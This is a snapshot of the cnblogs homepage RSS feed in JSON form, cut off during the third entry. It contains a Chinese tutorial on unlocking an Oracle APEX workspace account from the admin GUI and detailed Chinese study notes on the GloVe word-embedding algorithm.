{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "APEX实战第11篇：图形界面轻松解锁工作区账户",
      "link": "https://www.cnblogs.com/jyzhao/p/19524312/apex-shi-zhan-di11pian-tu-xing-jie-mian-qing-song",
      "published": "",
      "description": "<a name=\"top\"></a>\n    <h2><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jyzhao/p/19524312/apex-shi-zhan-di11pian-tu-xing-jie-mian-qing-song\" id=\"cb_post_title_url\" title=\"发布于 2026-01-24 00:21\">\n    <span>APEX实战第11篇：图形界面轻松解锁工作区账户</span>\n    \n\n</a>\n</h2>\n    <small>\n<span id=\"post-date\">2026-01-24 00:21</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jyzhao\">AlfredZhao</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</small>\n    <div class=\"entry\">\n        <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>APEX工作区的账户被锁定的原因基本都是因为该用户使用错误密码登录尝试的次数超过了安全限制。</p>\n<p>因为APEX为了账号的安全性考量，默认会有这样的安全策略设置：</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/635610/202601/635610-20260124002157433-12653719.jpg\" /></p>\n<p>当然这个设置值是可以按需设置修改的，具体在这个地方：</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/635610/202601/635610-20260124002157315-802019995.jpg\" /></p>\n<p>不过一般安全起见，也不建议去改太大，绝大多数场景还是默认就好。</p>\n<p>可如果因为哪位同事不小心尝试登录超出了安全限度，就会导致账号被锁定，此时也不必慌张，更不用去找具体命令，只要有权限登录 internal 的管理员在图形界面操作就可以顺利解锁账号，具体操作如下：</p>\n<p>首先需要管理员登录到 internal 的 Workspace，选择 <code>Manage Workspaces</code> -&gt; <code>Manage Developers and Users</code>，如下图所示：</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/635610/202601/635610-20260124002157246-931642568.jpg\" /></p>\n<p>找到你被锁的具体 User，点击进去到下面这个界面，在 <code>Account Availability</code> 选择 <code>Unlocked</code> 解锁，<code>Apply Changes</code> 即可。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/635610/202601/635610-20260124002157361-181439318.jpg\" /></p>\n<p>操作完就可以退出 internal Workspace，登录自己的Workspace发现之前被锁定的账号已经可以正常登录了。</p>\n\n</div>\n<div id=\"MySignature\">\n    <a href=\"https://www.cnblogs.com/jyzhao/\" target=\"_blank\">AlfredZhao</a>©版权所有「从Oracle起航，领略精彩的IT技术。」<br />\n转载请注明原文链接：<a href=\"https://www.cnblogs.com/jyzhao/p/19524312/apex-shi-zhan-di11pian-tu-xing-jie-mian-qing-song\" target=\"_blank\">https://www.cnblogs.com/jyzhao/p/19524312/apex-shi-zhan-di11pian-tu-xing-jie-mian-qing-song</a>\n<hr />\n<div style=\"text-align: center; margin-top: 30px;\">\n  <p style=\"font-size: 14px; color: #555;\">\n    👋 感谢阅读，欢迎关注我的公众号 <b>「赵靖宇」</b>\n  </p>\n  <img src=\"https://images.cnblogs.com/cnblogs_com/jyzhao/824234/o_250208075013_qrcode-zjy.jpg\" style=\"border: 1px solid #ddd; border-radius: 8px;\" width=\"160\" />\n</div>\n</div>\n<div class=\"clear\"></div>\n\n        <div class=\"clear\"></div>\n        \n</div>\n    <ul class=\"postmetadata\">\n        \n    </ul>"
    },
    {
      "title": "吴恩达深度学习课程五：自然语言处理  第二周：词嵌入（五）GloVe 算法",
      "link": "https://www.cnblogs.com/Goblinscholar/p/19524283",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Goblinscholar/p/19524283\" id=\"cb_post_title_url\" title=\"发布于 2026-01-23 23:59\">\n    <span>吴恩达深度学习课程五：自然语言处理  第二周：词嵌入（五）GloVe 算法</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>此分类用于记录吴恩达深度学习课程的学习笔记。<br />\n课程相关信息链接如下：</p>\n<ol>\n<li>原课程视频链接：<a href=\"https://www.bilibili.com/video/BV1FT4y1E74V?buvid=XU762317353676D786954061C192FE625463B&amp;from_spmid=playlist.playlist-detail.0.0&amp;is_story_h5=false&amp;mid=zqernykrmpf7XfIorMR%2FnA%3D%3D&amp;plat_id=116&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=ce0bc526-db69-428a-962e-c65ed8c267bc&amp;share_source=COPY&amp;share_tag=s_i&amp;spmid=united.player-video-detail.0.0&amp;timestamp=1713085655&amp;unique_k=DfBgvFW&amp;up_id=8654113&amp;vd_source=e035e9878d32f414b4354b839a4c31a4\" rel=\"noopener nofollow\" target=\"_blank\">[双语字幕]吴恩达深度学习deeplearning.ai</a></li>\n<li>github课程资料，含课件与笔记:<a href=\"https://github.com/robbertliu/deeplearning.ai-andrewNG\" rel=\"noopener nofollow\" target=\"_blank\">吴恩达深度学习教学资料</a></li>\n<li>课程配套练习（中英）与答案：<a href=\"https://blog.csdn.net/u013733326/article/details/79827273\" rel=\"noopener nofollow\" target=\"_blank\">吴恩达深度学习课后习题与答案</a></li>\n</ol>\n<p>本篇为第五课的第二周内容，<a href=\"https://www.bilibili.com/video/BV1FT4y1E74V?spm_id_from=333.788.videopod.episodes&amp;vd_source=e035e9878d32f414b4354b839a4c31a4&amp;p=170\" rel=\"noopener nofollow\" target=\"_blank\">2.8</a>的内容以及一些相关知识的补充。</p>\n<hr />\n<p>本周为第五课的第二周内容，与 CV 相对应的，这一课所有内容的中心只有一个：<strong>自然语言处理（Natural Language Processing，NLP）</strong>。<br />\n应用在深度学习里，它是专门用来进行<strong>文本与序列信息建模</strong>的模型和技术，本质上是在全连接网络与统计语言模型基础上的一次“结构化特化”，也是人工智能中<strong>最贴近人类思维表达方式</strong>的重要研究方向之一。<br />\n<strong>这一整节课同样涉及大量需要反复消化的内容，横跨机器学习、概率统计、线性代数以及语言学直觉。</strong><br />\n语言不像图像那样“直观可见”，更多是抽象符号与上下文关系的组合，因此<strong>理解门槛反而更高</strong>。<br />\n因此，我同样会尽量补足必要的背景知识，尽可能用比喻和实例降低理解难度。<br />\n本周的内容关于词嵌入，是一种<strong>相对于独热编码，更能保留语义信息的文本编码方式</strong>。通过词嵌入，模型不再只是“记住”词本身，而是能够<strong>基于语义关系进行泛化</strong>，在一定程度上实现类似“<strong>举一反三</strong>”的效果。词嵌入是 NLP 领域中最重要的基础技术之一。</p>\n<p>本篇的内容关于 <strong>GloVe 算法</strong>,是 Word2Vec 外，另一种以“全局”思想指导的词嵌入算法。</p>\n<h1 id=\"1-glove-算法思想\">1. GloVe 算法思想</h1>\n<p>在前面介绍 <a href=\"https://www.cnblogs.com/Goblinscholar/p/19504549\" target=\"_blank\">Word2Vec</a> 时，我们已经看到了一条非常清晰的学习路线：<strong>通过预测任务，让模型在训练中“顺便”学到词的向量表示</strong>。这种思路高效且直观，但也有一个绕不开的事实——它几乎完全依赖<strong>局部上下文</strong>。<br />\n这不难理解，在 Word2Vec 中，我们每次训练，都是使用<strong>窗口内的序列信息</strong>来学习相应的语义并更新词向量，每次更新只使用窗口内的词信息，词向量是在多次局部预测中逐步学习出来的。<br />\n由此，一个新的想法产生了：<strong>如果我们不只看窗口内的几步关系，而是把“整个语料里，词与词出现过多少次”都考虑进来，会发生什么？</strong></p>\n<p>GloVe 正是这一想法的产物。<br />\n在 2014 年，论文 <a href=\"https://aclanthology.org/D14-1162.pdf\" rel=\"noopener nofollow\" target=\"_blank\">GloVe: Global Vectors for Word Representation</a>被发表，论文认为<strong>词的语义信息，本质上蕴含在词与词的全局共现统计关系中，而词向量的任务，就是用一个低维连续空间去重现这种统计结构。</strong><br />\n最终，GloVe 将<strong>传统共现统计方法的全局视角</strong>，与<strong>分布式词向量的表达能力</strong>结合起来，形成了一种介于“计数方法”和“预测方法”之间的折中方案。<br />\n这里要专门说明的是，相比于传统神经网络，<strong>GloVe 没有隐藏层或激活函数</strong>，更像是一条通过词向量内积加偏置构成的<strong>线性计算流水线</strong>，但它仍然使用梯度下降来更新参数，实现对共现统计信息的拟合，我们很难用模型那一套来描述它，因此也相对较难理解。<br />\n下面就来分点展开 GloVe 算法的实现逻辑：</p>\n<h1 id=\"2-glove-算法的统计部分\">2. GloVe 算法的统计部分</h1>\n<p>GloVe 算法 的起手其实是传统的共现统计方法，<strong>这一部分并不涉及模型训练，而是对数据进行统计和处理，得到词汇间的全局关系。</strong><br />\n依旧分点来看这部分内容：</p>\n<h2 id=\"21-统计词共现矩阵\">2.1 统计词共现矩阵</h2>\n<p><strong>词共现矩阵</strong> 是传统统计方法里的基础概念，顾名思义，它是用来<strong>表示词与词之间共现关系的矩阵</strong>。</p>\n<p>规范一下，设词表大小为 <span class=\"math inline\">\\(V\\)</span>，定义一个矩阵 <span class=\"math inline\">\\(X \\in \\mathbb{R}^{V \\times V}\\)</span>，其中：</p>\n<p></p><div class=\"math display\">\\[X_{ij} = \\text{词 } j \\text{ 出现在词 } i \\text{ 上下文中的次数}  \n\\]</div><p></p><p>简单举个例子，假设语料只有一句话：</p>\n<blockquote>\n<p>I like deep learning</p>\n</blockquote>\n<p>显然，词表为：</p>\n<p></p><div class=\"math display\">\\[\\{\\text{I},\\ \\text{like},\\ \\text{deep},\\ \\text{learning}\\}  \n\\]</div><p></p><p>现在，设定<strong>上下文窗口大小为 1</strong>，即只考虑左右各一个词。<br />\n我们统计各词的共性关系如下：</p>\n<ol>\n<li>以 <strong>I</strong> 为中心：上下文只有 <em>like</em></li>\n<li>以 <strong>like</strong> 为中心：上下文是 <em>I</em> 和 <em>deep</em></li>\n<li>以 <strong>deep</strong> 为中心：上下文是 <em>like</em> 和 <em>learning</em></li>\n<li>以 <strong>learning</strong> 为中心：上下文只有 <em>deep</em></li>\n</ol>\n<p>由此，我们可以得到完整的词共现矩阵 <span class=\"math inline\">\\(X\\)</span>：</p>\n<p></p><div class=\"math display\">\\[X =\n\\begin{array}{c|cccc}\n &amp; \\text{I} &amp; \\text{like} &amp; \\text{deep} &amp; \\text{learning} \\\\\n\\hline\n\\text{I}        &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\\\\n\\text{like}     &amp; 1 &amp; 0 &amp; 1 &amp; 0 \\\\\n\\text{deep}     &amp; 0 &amp; 1 &amp; 0 &amp; 1 \\\\\n\\text{learning} &amp; 0 &amp; 0 &amp; 1 &amp; 0 \\\\\n\\end{array}\n\\]</div><p></p><p>补充几点细节：</p>\n<ol>\n<li>在常见的统计设定中，通常<strong>手工设定</strong>不将词与自身计入共现关系，因此<strong>共现矩阵的对角线往往为 0</strong>，但在真实语料中，若相同词在窗口范围内连续出现，则对应的对角元素也可能为非零值。</li>\n<li>词共现矩阵往往是<strong>高度稀疏的</strong>，大多数词对在语料中根本不会共现。</li>\n<li><strong>词共现矩阵是否对称，取决于设计的统计方式</strong>，在对称窗口下，这里的 <span class=\"math inline\">\\(X\\)</span> 是对称的，若区分左右上下文，矩阵则不一定对称。</li>\n</ol>\n<p>由此，我们就完成了 GloVe 算法在统计部分的第一步。<br />\n下一步，我们会<strong>把共现次数 <span class=\"math inline\">\\(X_{ij}\\)</span> 转化为条件概率 <span class=\"math inline\">\\(P(j|i)\\)</span></strong>，进一步引入向量训练的目标。</p>\n<h2 id=\"22-统计条件概率-\">2.2 统计条件概率 <span class=\"math inline\">\\(P(j \\mid i)\\)</span></h2>\n<p>在完成共现矩阵统计后，GloVe 的下一步是把<strong>绝对共现次数</strong>转化为<strong>条件概率</strong>，从而刻画词与词之间更直观的关系。<br />\n我们定义条件概率为：</p>\n<p></p><div class=\"math display\">\\[P(j \\mid i) = \\frac{X_{ij}}{\\sum_k X_{ik}}  \n\\]</div><p></p><p>其中：</p>\n<ul>\n<li><span class=\"math inline\">\\(X_{ij}\\)</span> 是词 <span class=\"math inline\">\\(j\\)</span> 出现在词 <span class=\"math inline\">\\(i\\)</span> 上下文中的次数，来自词共现矩阵。</li>\n<li><span class=\"math inline\">\\(\\sum_k X_{ik}\\)</span> 是以词 <span class=\"math inline\">\\(i\\)</span> 为中心时，所有上下文词出现次数的总和</li>\n</ul>\n<p><strong>最终，<span class=\"math inline\">\\(P(j \\mid i)\\)</span> 表示在语料库中，已知中心词为 <span class=\"math inline\">\\(i\\)</span> 的前提下，上下文词为 <span class=\"math inline\">\\(j\\)</span> 的经验概率。</strong></p>\n<p>我们继续使用上一节中的例子，根据共现矩阵：</p>\n<p></p><div class=\"math display\">\\[X =\n\\begin{array}{c|cccc}\n &amp; \\text{I} &amp; \\text{like} &amp; \\text{deep} &amp; \\text{learning} \\\\\n\\hline\n\\text{I}        &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\\\\n\\text{like}     &amp; 1 &amp; 0 &amp; 1 &amp; 0 \\\\\n\\text{deep}     &amp; 0 &amp; 1 &amp; 0 &amp; 1 \\\\\n\\text{learning} &amp; 0 &amp; 0 &amp; 1 &amp; 0 \\\\\n\\end{array}\n\\]</div><p></p><p>我们可以计算条件概率，例如：</p>\n<ol>\n<li>以 <strong>like</strong> 为中心：</li>\n</ol>\n<p></p><div class=\"math display\">\\[\\sum_k X_{\\text{like},k} = 1 + 0 + 1 + 0 = 2  \n\\]</div><p></p><p>于是：</p>\n<p></p><div class=\"math display\">\\[P(\\text{I} \\mid \\text{like}) = \\frac{1}{2} = 0.5, \\quad  \nP(\\text{deep} \\mid \\text{like}) = \\frac{1}{2} = 0.5  \n\\]</div><p></p><ol start=\"2\">\n<li>以 <strong>I</strong> 为中心：</li>\n</ol>\n<p></p><div class=\"math display\">\\[\\sum_k X_{\\text{I},k} = 0 + 1 + 0 + 0 = 1  \n\\]</div><p></p><p>所以：</p>\n<p></p><div class=\"math display\">\\[P(\\text{like} \\mid \\text{I}) = 1  \n\\]</div><p></p><p><strong>最终，通过这种方式，我们就得到了语料库中每个词的上下文概率分布。</strong><br />\n我们整理例子的概率分布矩阵如下：</p>\n<p></p><div class=\"math display\">\\[P =  \n\\begin{array}{c|cccc}  \n&amp; \\text{I} &amp; \\text{like} &amp; \\text{deep} &amp; \\text{learning} \\\\  \n\\hline  \n\\text{I} &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\\\\n\\text{like} &amp; 0.5 &amp; 0 &amp; 0.5 &amp; 0 \\\\  \n\\text{deep} &amp; 0 &amp; 0.5 &amp; 0 &amp; 0.5 \\\\  \n\\text{learning} &amp; 0 &amp; 0 &amp; 1 &amp; 0 \\\\  \n\\end{array}  \n\\]</div><p></p><p>其中：</p>\n<ul>\n<li><strong>行表示中心词 <span class=\"math inline\">\\(i\\)</span></strong></li>\n<li><strong>列表示上下文词 <span class=\"math inline\">\\(j\\)</span></strong></li>\n<li><strong>每个元素 <span class=\"math inline\">\\(P_{ij}\\)</span></strong> 即为 <span class=\"math inline\">\\(P(j|i)\\)</span></li>\n</ul>\n<p>自此，我们就完成了GloVe 算法在统计部分的全部内容。<br />\n下面，就是它的建模部分。</p>\n<h1 id=\"3-glove-算法的模型部分\">3. GloVe 算法的模型部分</h1>\n<p>在完成统计阶段后，我们得到了全局的共现信息及概率分布。<strong>模型部分的核心任务</strong>就是：利用这些统计信息训练出词向量，使得词向量能够<strong>反映词与词之间的语义关系</strong>。</p>\n<p>GloVe 的核心思想可以概括为一句话：<strong>词向量的内积应该能够拟合词与词之间的共现概率</strong>。<br />\n我们依旧分点来进行这部分内容：</p>\n<h2 id=\"31-计算概率比例\">3.1 计算概率比例</h2>\n<p>首先，GloVe 并不直接去拟合条件概率 <span class=\"math inline\">\\(P(j|i)\\)</span>，而是利用<strong>概率比例</strong>刻画语义关系。<br />\n设有中心词 <span class=\"math inline\">\\(i\\)</span>，上下文词 <span class=\"math inline\">\\(j\\)</span> 和 <span class=\"math inline\">\\(k\\)</span>，则概率比例如下：</p>\n<p></p><div class=\"math display\">\\[\\frac{P(j \\mid i)}{P(k \\mid i)}  \n\\]</div><p></p><p>这并不难理解：</p>\n<ul>\n<li>如果比例大，说明 <span class=\"math inline\">\\(i\\)</span> 更倾向于与 <span class=\"math inline\">\\(j\\)</span> 一起出现。</li>\n<li>如果比例小，说明 <span class=\"math inline\">\\(i\\)</span> 更倾向于与 <span class=\"math inline\">\\(k\\)</span> 一起出现。</li>\n</ul>\n<p>继续使用同样的例子，我们刚刚得到条件概率矩阵如下：</p>\n<p></p><div class=\"math display\">\\[P =  \n\\begin{array}{c|cccc}  \n&amp; \\text{I} &amp; \\text{like} &amp; \\text{deep} &amp; \\text{learning} \\\\  \n\\hline  \n\\text{I} &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\\\  \n\\text{like} &amp; 0.5 &amp; 0 &amp; 0.5 &amp; 0 \\\\  \n\\text{deep} &amp; 0 &amp; 0.5 &amp; 0 &amp; 0.5 \\\\  \n\\text{learning} &amp; 0 &amp; 0 &amp; 1 &amp; 0 \\\\  \n\\end{array}  \n\\]</div><p></p><p>对于中心词 <strong>like</strong>，其上下文词分别为 <strong>I</strong> 和 <strong>deep</strong>，则：</p>\n<p></p><div class=\"math display\">\\[\\frac{P(\\text{I} \\mid \\text{like})}{P(\\text{deep} \\mid \\text{like})} = \\frac{0.5}{0.5} = 1  \n\\]</div><p></p><p>这个比例表示，“like”与“I”和“deep”的关系<strong>同样强</strong>。<br />\n换句话说，如果模型想拟合这个关系，词向量在空间中的表现应该让 <strong>like-I</strong> 与 <strong>like-deep</strong> 的内积接近。</p>\n<p>而如果概率比例不是 1，例如假设在更大语料中统计到：</p>\n<p></p><div class=\"math display\">\\[P(\\text{I} \\mid \\text{like}) = 0.3, \\quad P(\\text{deep} \\mid \\text{like}) = 0.6  \n\\]</div><p></p><p>则比例为：</p>\n<p></p><div class=\"math display\">\\[\\frac{P(\\text{I} \\mid \\text{like})}{P(\\text{deep} \\mid \\text{like})} = \\frac{0.3}{0.6} = 0.5  \n\\]</div><p></p><p>这个比例小于 1，说明“like”<strong>更倾向于与 deep 一起出现</strong>，与 I 的关联较弱。模型训练时，GloVe 就会尝试让词向量 <strong>like-deep</strong> 的内积大于 <strong>like-I</strong> 的内积，以反映这种强弱关系。</p>\n<p>这一步，我们通过比例概率实现了对语义的量化，而下一步就是 GloVe 的核心内容：</p>\n<h2 id=\"32-构建向量关系\">3.2 构建向量关系</h2>\n<p>在这一步，GloVe 就可以将概率比例量化的<strong>语义偏好</strong>转化为<strong>向量空间中的相对位置</strong>，从而实现统计信息到词向量的映射。<br />\n换句话说，我们希望通过训练得到的词向量，使得在向量空间中，中心词与上下文词的相对位置<strong>能够反映它们在语料中的共现强弱</strong>。<br />\n来看看 GloVe 实现这一步的具体逻辑：</p>\n<p>首先，设定：</p>\n<ol>\n<li><strong>中心词</strong> <span class=\"math inline\">\\(i\\)</span> 的词向量为 <span class=\"math inline\">\\(w_i \\in \\mathbb{R}^d\\)</span></li>\n<li><strong>上下文词</strong> <span class=\"math inline\">\\(j,k\\)</span> 的词向量为 <span class=\"math inline\">\\(\\tilde w_j, \\tilde w_k \\in \\mathbb{R}^d\\)</span></li>\n</ol>\n<p>GloVe 通过以下假设将概率比例与向量联系起来：</p>\n<p></p><div class=\"math display\">\\[F(w_i, \\tilde w_j, \\tilde w_k) = \\frac{P(j \\mid i)}{P(k \\mid i)}  \n\\]</div><p></p><p>其中函数 <span class=\"math inline\">\\(F\\)</span> 的含义是：<strong>用向量操作去表示概率比例，模型的目标就是拟合这个函数 <span class=\"math inline\">\\(F\\)</span> 。</strong></p>\n<p>也就是说，我们的目标是：</p>\n<p></p><div class=\"math display\">\\[\\frac{P(j \\mid i)}{P(k \\mid i)} \\approx {\\text{模型预测的某个函数值}}{}  \n\\]</div><p></p><p><strong>但是，直接拟合比例本身有几个问题</strong>：</p>\n<ol>\n<li><strong>比例范围广</strong>：条件概率 <span class=\"math inline\">\\(P(j|i)\\)</span> 属于 <span class=\"math inline\">\\([0,1]\\)</span>，两个概率比值可能非常大或非常小（比如 <span class=\"math inline\">\\(0.001/0.5 = 0.002\\)</span>），直接拟合容易数值不稳定。</li>\n<li><strong>向量空间线性映射困难</strong>：我们希望用向量内积（<span class=\"math inline\">\\(w_i^\\top \\tilde w_j\\)</span>）表示关系，但向量内积是线性且可正可负，而概率比总是正且变化范围大，直接用内积去拟合会很不直观，也容易数值不稳定。</li>\n</ol>\n<p>所以我们需要一个<strong>桥梁函数</strong>，把比例转换成更适合线性建模的形式。</p>\n<h2 id=\"33-转换概率比例\">3.3 转换概率比例</h2>\n<p>在这里，GloVe 选择了 <strong>对数函数</strong>，把比例变成 <strong>内积差</strong>：</p>\n<p></p><div class=\"math display\">\\[\\log \\frac{P(j \\mid i)}{P(k \\mid i)} =\\log P(j|i) - \\log P(k|i) \\approx (w_i^\\top \\tilde w_j + b_i + \\tilde b_j) - (w_i^\\top \\tilde w_k + b_i + \\tilde b_k)\n\\]</div><p></p><p>我们来详细解释一下这步推导的逻辑：</p>\n<ol>\n<li><strong>对数的作用</strong>:<br />\n对数函数可以把原本范围很广的正数概率比压缩到数值更稳定的区间，并且把<strong>乘法关系转化为加法关系</strong>。数值范围收敛，更利于模型学习，同时便于线性处理。</li>\n<li><strong>对映射的影响</strong>：<br />\n取了对数之后，原本的比例关系就转化为“加减法”的形式，而向量内积本身就是线性可加的操作（<span class=\"math inline\">\\(w_i^\\top \\tilde w_j\\)</span> 是实数线性组合）。对数后的比例差可以直接用 <strong>线性模型</strong>（内积加偏置）来拟合，保证概率比越大，内积差越大；概率比越小，内积差越小。</li>\n<li><strong>偏置项的作用</strong> ：<br />\n偏置项 <span class=\"math inline\">\\(b_i, \\tilde b_j\\)</span> 用于<strong>捕捉词自身的出现频率差异</strong>。<br />\n高频词往往在语料中出现次数多，直接用向量内积可能被整体频率影响而偏离比例。<br />\n偏置项可以单独调整每个词的基准水平，让向量内积专注于<strong>词与词之间的相对关系</strong>，而不受词频本身干扰。</li>\n</ol>\n<p>最终，我们通过公式实现了这样的作用：</p>\n<p></p><div class=\"math display\">\\[\\text{概率比例（统计信息）} \\xrightarrow{\\log} \\text{线性可加的形式} \\xrightarrow{\\text{内积+偏置}} \\text{向量表示拟合目标}  \n\\]</div><p></p><p>回到例子，假设在某大语料中统计到：</p>\n<p></p><div class=\"math display\">\\[P(\\text{I} \\mid \\text{like}) = 0.3, \\quad P(\\text{deep} \\mid \\text{like}) = 0.6  \n\\]</div><p></p><p>则：</p>\n<p></p><div class=\"math display\">\\[\\log \\frac{P(\\text{I} \\mid \\text{like})}{P(\\text{deep} \\mid \\text{like})} = \\log 0.5 \\approx -0.693  \n\\]</div><p></p><p>因此，模型希望通过训练得到的向量，使得：</p>\n<p></p><div class=\"math display\">\\[(w_\\text{like}^\\top \\tilde w_\\text{I} + b_\\text{like} + \\tilde b_\\text{I}) - (w_\\text{like}^\\top \\tilde w_\\text{deep} + b_\\text{like} + \\tilde b_\\text{deep}) \\approx -0.693  \n\\]</div><p></p><p>这样，训练后，词向量在空间中，“like” 会更靠近 “deep”，远离 “I”，以反映概率比例。</p>\n<p>下面就是最后一步了：</p>\n<h2 id=\"34-构建损失函数并训练\">3.4 构建损失函数并训练</h2>\n<p>在完成概率比例到向量内积映射后，GloVe 还需要一个<strong>可优化的损失函数</strong>来让训练可执行。<br />\n这一步的思想是：<strong>让向量内积（加偏置）尽量逼近对数共现概率</strong>，同时对高频和低频词对做合理的权衡。</p>\n<p>GloVe 的损失函数定义为：</p>\n<p></p><div class=\"math display\">\\[J = \\sum_{i,j=1}^{V} f(X_{ij}) \\left( w_i^\\top \\tilde w_j + b_i + \\tilde b_j - \\log X_{ij} \\right)^2  \n\\]</div><p></p><p>看起来很复杂，实际上也不简单，我们详细解释一下各部分含义：</p>\n<ol>\n<li>\n<p><strong>权重函数 <span class=\"math inline\">\\(f(X_{ij})\\)</span></strong>：<br />\n为了平衡高频和低频词对的影响，GloVe 引入了一个加权函数：</p>\n<p></p><div class=\"math display\">\\[   f(x) =\n   \\begin{cases} \n   \\left(\\dfrac{x}{x_\\text{max}}\\right)^\\alpha, &amp; x &lt; x_\\text{max} \\\\\n   1, &amp; x \\ge x_\\text{max}\n   \\end{cases}\n\\]</div><p></p><p>这里 <span class=\"math inline\">\\(x_\\text{max}\\)</span> 是阈值，<span class=\"math inline\">\\(\\alpha\\)</span> 通常取 <span class=\"math inline\">\\(0.75\\)</span>。<br />\n这是为了让高频词对不会主导训练，低频词对仍有一定权重。</p>\n</li>\n<li>\n<p><strong><span class=\"math inline\">\\(w_i^\\top \\tilde w_j + b_i + \\tilde b_j\\)</span></strong>  ：模型预测的对数共现次数，即词向量加偏置的线性组合。</p>\n</li>\n<li>\n<p><strong><span class=\"math inline\">\\(\\log X_{ij}\\)</span></strong>  ：对应统计信息的对数共现次数，是我们希望模型逼近的目标。</p>\n</li>\n<li>\n<p><strong>平方误差 <span class=\"math inline\">\\((\\cdot)^2\\)</span></strong>  ：衡量预测值与目标值之间的差距，使模型通过梯度下降最小化误差。</p>\n</li>\n</ol>\n<p>这里就可以解释我们<a href=\"https://www.cnblogs.com/Goblinscholar/p/19494158\" target=\"_blank\">在本周第一篇</a>中留下的问题：<strong>词向量的长度受什么影响？</strong><br />\n因为高频词在语料中出现次数多，因此它的共现矩阵行/列上的元素整体偏大，经过训练后，模型为了尽量逼近 <span class=\"math inline\">\\(\\log X_{ij}\\)</span>，会使得这些高频词的向量内积整体偏大，从而对应的向量长度也相对较长。<br />\n<strong>也就是说，词向量的长度与词频正相关，但本身没有其他明确的语义解释，只是统计特性导致的结果。</strong></p>\n<p>同时，在这里你可能会有一个问题：<strong>我们刚刚引入了概率比例和内积差的关系，为什么损失函数里都没有用到？</strong><br />\n实际上，对某个中心词 <span class=\"math inline\">\\(i\\)</span>，任意两个上下文词 <span class=\"math inline\">\\(j,k\\)</span>，若你看损失梯度，会发现：<br />\n在优化过程中，梯度会自然调整 <span class=\"math inline\">\\(w_i\\)</span>，让 <strong>共现次数更多、概率大的词对应内积更大，共现次数更少、概率小的词对应内积更小</strong>。<br />\n换句话说，<strong>比例关系会通过梯度自动体现出来</strong>，不需要显式算比值，并且这样还避免了显式计算所有词对之间的概率比造成的计算开销。</p>\n<p>还是用我们的例子，假设在大语料中：</p>\n<table>\n<thead>\n<tr>\n<th>中心词</th>\n<th>上下文词</th>\n<th>共现次数 <span class=\"math inline\">\\(X_{ij}\\)</span></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>like</td>\n<td>I</td>\n<td>3</td>\n</tr>\n<tr>\n<td>like</td>\n<td>deep</td>\n<td>6</td>\n</tr>\n</tbody>\n</table>\n<p>则训练目标：</p>\n<ol>\n<li>对 <strong>like-I</strong>：\n<ul>\n<li>目标 <span class=\"math inline\">\\(\\log X_{\\text{like,I}} = \\log 3 \\approx 1.099\\)</span></li>\n<li>模型希望 <span class=\"math inline\">\\(w_\\text{like}^\\top \\tilde w_\\text{I} + b_\\text{like} + \\tilde b_\\text{I} \\approx 1.099\\)</span></li>\n</ul>\n</li>\n<li>对 <strong>like-deep</strong>：\n<ul>\n<li>目标 <span class=\"math inline\">\\(\\log X_{\\text{like,deep}} = \\log 6 \\approx 1.792\\)</span></li>\n<li>模型希望 <span class=\"math inline\">\\(w_\\text{like}^\\top \\tilde w_\\text{deep} + b_\\text{like} + \\tilde b_\\text{deep} \\approx 1.792\\)</span></li>\n</ul>\n</li>\n<li>权重函数 <span class=\"math inline\">\\(f(X_{ij})\\)</span> 可以调节两者在训练中的影响，使模型更稳健。</li>\n</ol>\n<p>训练时，GloVe <strong>会遍历所有有共现的词对</strong>，计算加权平方误差，利用梯度下降优化 <span class=\"math inline\">\\(w_i, \\tilde w_j, b_i, \\tilde b_j\\)</span>，直到误差收敛。<br />\n最后，你会发现，GloVe 的整个传播过程同时在维护两个词向量矩阵：</p>\n<ol>\n<li><strong>中心词向量 <span class=\"math inline\">\\(w_i\\)</span></strong></li>\n<li><strong>上下文词向量 <span class=\"math inline\">\\(\\tilde w_j\\)</span></strong><br />\n而通常，我们将两者相加或平均作为最终词向量：</li>\n</ol>\n<p></p><div class=\"math display\">\\[v_i = w_i + \\tilde w_i  \n\\]</div><p></p><p>这样得到的 <span class=\"math inline\">\\(v_i\\)</span> 便同时存在作为中心词和上下文词的语义距离，刻画了词与词之间的全局共现关系。</p>\n<h1 id=\"4-总结\">4. 总结</h1>\n<p>因为 GloVe 相比起来较为复杂，这里我们不再表格整理概念了，而是<strong>整体梳理一遍其传播过程</strong>。<br />\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260123235856508-1491140111.png\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-23 23:59</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Goblinscholar\">哥布林学者</a>&nbsp;\n阅读(<span id=\"post_view_count\">4</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "ARM Q 饱和运算快速入门指南",
      "link": "https://www.cnblogs.com/lsksp/p/19524284",
      "published": "",
